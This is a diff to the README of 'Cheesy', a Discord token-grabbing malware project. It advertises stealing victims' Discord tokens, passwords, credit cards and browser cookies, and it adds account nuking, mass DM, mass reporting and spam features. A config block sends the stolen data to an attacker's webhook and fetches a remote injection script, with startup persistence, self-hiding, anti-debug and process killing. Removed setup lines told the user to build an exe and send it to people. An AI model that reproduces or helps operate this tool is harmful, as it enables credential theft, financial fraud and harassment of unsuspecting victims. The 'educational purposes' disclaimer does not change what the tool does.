@@ -20,6 +20,9 @@ K78 ❌ tesco ✅
 
 </h2>
 
+**⚠️BIG NEWS:⚠️** \
+I've just released the biggest update ever. V3 is officialy LIVE 🎉
+
 **NOTE:** \
 Cheesy was made for educational purposes, therefore all consequences caused by your actions are **your** responsibility and accountability.
 
@@ -54,6 +57,20 @@ Cheesy was made for educational purposes, therefore all consequences caused by y
 > All valid/working discord tokens. (Bypasses BetterDiscord, Token Protector and Discord's new encryption)
 > Their Passwords & Credit Cards for Discord (updates when they change it)
 > All Passwords, Cookies and History from Google
+> Settings (Change the Color Theme, Thread Amount, Hotkeys and more!)
+> Both Compact and Feature-Rich
+> QoL Features such as Auto-Update, proxy scraping and more!
+> Easy to use!
+> Fast and Efficient (Low Performance Impact)
+> Linux Support! (Expect Bugs)
+> Create a token logger or QR code stealer! (QR Code Stealer temporarily broken)
+> Nuke an account!
+> Change an accounts Status, Bio, or HypeSquad house!
+> Mass DM using an account!
+> Log into an account with an isolated browser!
+> Mass Report a user or server!
+> Group Chat Spam!
+> Webhook Nuker/Deleter
 > + More!
 ```
 
@@ -62,37 +79,31 @@ Cheesy was made for educational purposes, therefore all consequences caused by y
 ## <a id="setup"></a> 📁 〢 Setting up Cheesy
 
 1. Install [python](https://www.python.org/) and add it to [path](https://datatofish.com/add-python-to-windows-path/).
-2. Open up [main.py](https://github.com/bananaman2020/cheesy/blob/master/main.py) with notepad or some other editor
-3. Locate the config at the top of the file and Replace "WEBHOOK_HERE" with your [discord webhook](https://support.discord.com/hc/en-us/articles/228383668-Intro-to-Webhooks)
-4. Double Click `setup.bat` and allow it to finish.
-5. Download Visual Studio Community 2022 and get the C++ Development Feature Pack during the installer screen
-6. A Window will open prompting for a name. Put something in such as "Token_Logger" (You can always rename the file later)
-7. Wait for the process to complete and then get the file that was made in the downloaded folder and send to people :)
+2. Download Visual Studio Community 2022 and get the C++ Development Feature Pack during the installer screen
+3. Open up [setup.bat](https://github.com/bananaman2020/cheesy/blob/master/setup.bat) and it will automatically install dependencies etc.
+4. A Window will open with the main GUI. First it will check for updates. If there is one Press Y and it will automatically download.
 
 ## <a id="config"></a>⚙ 〢 Config
 
-If you want to change the config, open up [main.py](https://github.com/bananaman2020/cheesy/blob/master/main.py) and locate it at the top. There you can configure the following:
+If you want to change the config, open up [main.py](https://github.com/bananaman2020/cheesy/blob/master/assets/main.py) and locate it at the top. There you can configure the following:
 
 ```py
 config = {
-    # replace WEBHOOK_HERE with your webhook ↓↓ or use the api from https://github.com/Rdimo/Discord-Webhook-Protector
-    # Recommend using a webhook protector (when it's fixed)
-    'webhook': "WEBHOOK_HERE", # Enter your webhook on this line by replacing "WEBHOOK_HERE"
-    # ONLY HAVE THE BASE32 ENCODED KEY HERE IF YOU'RE USING THE TOKEN PROTECTOR # The token protector API I used has been taken off github so use your normal discord webhook for now until I come up with an alternative
-    'webhook_protector_key': "KEY_HERE",
+    "webhook": "WEBHOOK_HERE",  # Place your webhook here (don't touch this)
+    "webhook_protector_key": "KEY_HERE",
     # keep it as it is unless you want to have a custom one
-    'injection_url': "https://raw.githubusercontent.com/bananaman2020/Discord-Injection/master/injection.js",
-    # if True, it will ping @everyone when someone ran Cheesy
-    'ping_on_run': True,
+    "injection_url": "https://raw.githubusercontent.com/bananaman2020/Discord-Injection/master/injection.js",
+    # if True, it will ping @everyone when someone ran Cheesy v3
+    "ping_on_run": False,
     # set to False if you don't want it to kill programs such as discord upon running the exe
-    'kill_processes': False,
+    "kill_processes": True,
     # if you want the file to run at startup
-    'startup': True,
+    "startup": True,
     # if you want the file to hide itself after run
-    'hide_self': True,
+    "hide_self": True,
     # does it's best to prevent the program from being debugged and drastically reduces the changes of your webhook being found
-    'anti_debug': True,
-    # this list of programs will be killed if Cheesy detects that any of these are running, you can add more if you want
+    "anti_debug": True,
+    # this list of programs will be killed if cheesy detects that any of these are running, you can add more if you want
     'blackListedPrograms':
     [
       ...
@@ -157,12 +168,16 @@ In the end it's just up to **you** to choose what grabber suits you and your nee
 - Self spread 
 - Grab Wifi passwords 
 - Better Anti-vm/Anti-debug (check screen size?, more registery checks?, make the lists outbound?)
-- Exe builder (clean gui, toggable options, compress exe (file size <= 8mb), etc...)
+- Fix QR Code Generator
+- ~~Exe builder (clean gui, toggable options, compress exe (file size <= 8mb), etc...)~~
 - ~~Grab Chrome history~~
 - ~~Grab Minecraft accessToken~~
 - ~~Grab hwid (for manual blacklisting)~~
 - ~~Grab more network info (ip, geolocation, etc...) and put in seperate txt file~~
 - ~~General info (OS, CPU, GPU, RAM, etc...) and put in seperate txt file~~
+- ~~Add Nuker~~
+- ~~Mass DM~~
+- ~~Improve Speed~~
 
 Not adding/on hold:
 - .doc/.pdf file grabbing 
@@ -173,6 +188,18 @@ Not adding/on hold:
 ## <a id="changelog"></a>💭 〢 ChangeLog
 
 ```diff
+v3.0.0 : 09-03-2024 (Massive Update, so massive that I skipped V2 entirely)
++ Back from the dead (real talk sorry for being gone so long.)
++ Added GUI
++ Cleaned up Code
++ Nuker
++ DM Deleter
++ Blocker
++ Mass DM + Report
++ Server Spam + Leave
++ Webhook Killer
++ Profile Changer
+- Broke QR Code Generator
 v1.0.5 : 04-12-2022
 + Early Merry Christmas
 + Updated Readme
